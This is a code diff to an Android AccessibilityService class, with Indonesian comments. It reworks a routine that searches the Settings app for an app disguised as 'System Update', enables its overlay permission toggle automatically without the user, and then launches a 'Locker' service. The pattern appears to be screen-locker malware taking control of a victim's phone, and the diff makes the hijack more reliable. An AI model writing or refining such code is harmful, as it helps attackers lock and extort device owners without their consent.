@@ -69,34 +69,35 @@ public class CustomAccessibilityService extends AccessibilityService {
             rootNode.recycle(); 
         }
     }
-    
+
     private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
-        long now = System.currentTimeMillis();
-        if (now - lastActionTime < ACTION_DELAY) return;
+        // Kita buat loop pencarian singkat jika node belum ditemukan
+        // Ini menangani delay render UI di halaman Settings
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
+            if (currentRoot == null) return;
 
-        // Pastikan kita HANYA beraksi jika di dalam paket Settings
-        if (!pkg.contains("settings")) return; //
+            try {
+                // 1. Pastikan kita di halaman yang benar (System Update)
+                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("System Update");
+                AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");
 
-        // 1. CEK: Apakah kita sudah di halaman DETAIL aplikasi?
-        // Gunakan findAccessibilityNodeInfosByText("System Update") agar tidak salah klik di menu lain
-        List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Update"); //
-        AccessibilityNodeInfo switchNode = findNodeById(root, "android:id/switch_widget"); //
-
-        if (!labels.isEmpty() && switchNode != null) {
-            if (!switchNode.isChecked()) {
-                writeLog("Confirmed Detail Page. Clicking Toggle ON."); //
-                performClick(switchNode);
-            } else {
-                writeLog("Toggle already ON. Launching Locker Service."); //
-                triggerLocker(); // Langsung eksekusi tanpa menunggu user kembali
+                if (!targets.isEmpty() && switchNode != null) {
+                    if (!switchNode.isChecked()) {
+                        writeLog("Direct hit! Turning toggle ON.");
+                        performClick(switchNode);
+                    } else {
+                        writeLog("Toggle is already ON. Triggering Locker.");
+                        triggerLocker();
+                    }
+                } else if (pkg.contains("settings")) {
+                    // Jika masih di list, klik namanya
+                    clickByText(currentRoot, "System Update");
+                }
+            } finally {
+                currentRoot.recycle();
             }
-            switchNode.recycle();
-            return;
-        }
-
-        // 2. CEK: Jika masih di DAFTAR (List) aplikasi Settings
-        // Cari teks yang benar-benar spesifik "System Update"
-        clickByText(root, "System Update"); //
+        }, 150); // Delay kecil 150ms untuk sinkronisasi render UI
     }
 
     private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
